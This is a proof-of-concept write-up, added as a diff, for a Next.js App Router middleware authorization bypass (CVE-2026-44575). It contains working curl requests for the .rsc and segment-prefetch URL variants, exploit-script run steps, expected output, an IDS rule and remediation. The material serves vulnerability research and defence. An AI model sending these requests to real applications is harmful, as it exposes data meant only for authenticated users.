@@ -1,0 +1,190 @@
+
+<!-- 
+  File: 2026-05-17_nextjs-segment-prefetch-middleware-bypass.md
+  Location: pocs/<category>/
+-->
+
+---
+
+## Metadata
+
+| Field | Value |
+|---|---|
+| **Date Added** | 2026-05-17 |
+| **Last Updated** | 2026-05-09 |
+| **Author / Researcher** | dwisiswant0 |
+| **CVE / Advisory** | CVE-2026-44575 |
+| **Category** | web |
+| **Severity** | High |
+| **CVSS Score** | 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N) |
+| **Status** | Weaponized |
+| **Tags** | authorization-bypass, middleware-bypass, App-Router, segment-prefetch, RSC, Next.js, unauthenticated |
+| **Related** | N/A |
+
+---
+
+## Affected Target
+
+| Field | Value |
+|---|---|
+| **Software / System** | Next.js App Router applications that rely on `middleware.ts` matchers to protect routes |
+| **Versions Affected** | 15.2.0–15.5.15 and 16.0.0–16.2.4 (fixed in 15.5.16 / 16.2.5) |
+| **Language / Platform** | JavaScript / Node.js |
+| **Authentication Required** | No |
+| **Network Access Required** | Yes |
+
+---
+
+## Summary
+
+CVE-2026-44575 is an authorization bypass in Next.js App Router middleware matching. Vulnerable versions compile middleware matchers for canonical paths and legacy Pages Router data routes, but omit the App Router transport variants used for `.rsc` and segment-prefetch fetches. An unauthenticated attacker can request those alternate URL shapes for a protected page and receive the same page payload without the middleware auth check running.
+
+---
+
+## Vulnerability Details
+
+### Root Cause
+
+In vulnerable Next.js releases, `getMiddlewareMatchers` generated a matcher suffix that allowed only the canonical pathname and optional `.json` data-route form. The matcher did not include App Router transport suffixes such as `<path>.rsc` or `<path>.segments/$c$children/__PAGE__.segment.rsc`, even though the router still resolved those requests to the same logical page.
+
+### Attack Vector
+
+An attacker sends a request for a protected App Router page using either the `.rsc` transport variant or the segment-prefetch variant, together with RSC/prefetch headers such as `RSC: 1`, `Next-Router-Prefetch: 1`, or `Next-Router-Segment-Prefetch: /__PAGE__`. Because the middleware matcher does not recognize the alternate URL shape, middleware is skipped while the App Router still renders the protected page payload.
+
+### Impact
+
+Successful exploitation bypasses middleware-enforced authorization, locale, or feature-flag controls for protected App Router pages. The attacker can obtain the React Server Component payload for the page, which may expose server-rendered content, serialized props, internal links, and other sensitive data intended only for authenticated users.
+
+---
+
+## Environment / Lab Setup
+
+```
+OS:          Linux/macOS/Windows
+Target:      Next.js 15.2.0–15.5.15 or 16.0.0–16.2.4 App Router app with middleware-protected routes
+Attacker:    Any host able to send crafted HTTP requests
+Tools:       python3, bash, curl
+```
+
+### Setup Steps
+
+```bash
+git clone https://github.com/dwisiswant0/next-16.2.4-pocs.git
+cd next-16.2.4-pocs/poc/CVE-2026-44575_GHSA-267c-6grr-h53f
+
+TARGET=http://localhost:3000 python3 exploit.py
+TARGET=http://localhost:3000 bash exploit.sh
+```
+
+---
+
+## Proof of Concept
+
+### Step-by-Step Reproduction
+
+1. **Request the canonical protected path** and confirm middleware blocks or redirects it.
+   ```bash
+   curl -i 'http://127.0.0.1:3000/dashboard'
+   ```
+
+2. **Fetch the `.rsc` transport variant** with RSC/prefetch headers.
+   ```bash
+   curl -i \
+     -H 'RSC: 1' \
+     -H 'Next-Router-Prefetch: 1' \
+     -H 'Next-Router-State-Tree: ["",{}]' \
+     -H 'Accept: text/x-component' \
+     'http://127.0.0.1:3000/dashboard.rsc'
+   ```
+
+3. **Fetch the segment-prefetch transport variant** and compare the response.
+   ```bash
+   curl -i \
+     -H 'RSC: 1' \
+     -H 'Next-Router-Segment-Prefetch: /__PAGE__' \
+     -H 'Accept: text/x-component' \
+     'http://127.0.0.1:3000/dashboard.segments/$c$children/__PAGE__.segment.rsc'
+   ```
+
+### Exploit Code
+
+> See `exploit.py` and `exploit.sh` in this folder.
+
+```python
+from exploit import main
+
+main()
+```
+
+### Expected Output
+
+```
+[1/4] Baseline — canonical path GET /dashboard
+  HTTP 307
+  location: /login?from=%2Fdashboard
+
+[2/4] Bypass #1 — .rsc transport variant
+  HTTP 200   content-type: text/x-component; charset=utf-8
+
+[3/4] Bypass #2 — segment-prefetch transport variant
+  HTTP 200   content-type: text/x-component; charset=utf-8
+
+>>> RESULT: PASS (vulnerability reproduced) <<<
+```
+
+---
+
+## Screenshots / Evidence
+
+- `screenshots/` — add request/response captures showing the canonical path redirect and successful `.rsc` / segment-prefetch responses
+
+---
+
+## Detection & Indicators of Compromise
+
+```
+GET /dashboard.rsc HTTP/1.1
+GET /dashboard.segments/$c$children/__PAGE__.segment.rsc HTTP/1.1
+RSC: 1
+Next-Router-Prefetch: 1
+Next-Router-Segment-Prefetch: /__PAGE__
+```
+
+**SIEM / IDS Rule (example):**
+```
+alert http any any -> $HTTP_SERVERS any (
+  msg:"Possible Next.js App Router middleware bypass attempt";
+  content:".segment.rsc"; http_uri;
+  content:"Next-Router-Segment-Prefetch|3a|"; http_header;
+  sid:900044575; rev:1;
+)
+```
+
+---
+
+## Remediation
+
+| Action | Detail |
+|---|---|
+| **Patch** | Upgrade Next.js to 15.5.16+ or 16.2.5+ |
+| **Workaround** | Enforce authorization inside the protected page/layout as well as middleware, and block `.rsc` / segment-prefetch transport URLs for sensitive routes at the reverse proxy or WAF |
+| **Config Hardening** | Monitor requests for App Router transport suffixes on protected paths and review middleware matcher coverage for non-canonical route variants |
+
+---
+
+## References
+
+- [CVE-2026-44575 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-44575)
+- [Next.js Security Advisory — GHSA-267c-6grr-h53f](https://github.com/vercel/next.js/security/advisories/GHSA-267c-6grr-h53f)
+- [Next.js Patch Commit d166096c39](https://github.com/vercel/next.js/commit/d166096c39)
+- [Next.js Patch Commit 0dd94836a8](https://github.com/vercel/next.js/commit/0dd94836a8)
+- [Source Repository — dwisiswant0/next-16.2.4-pocs](https://github.com/dwisiswant0/next-16.2.4-pocs)
+
+---
+
+## Notes
+
+Auto-ingested from https://github.com/dwisiswant0/next-16.2.4-pocs on 2026-05-17.
+
+Issue notes indicate no known active exploitation at time of reporting.
+
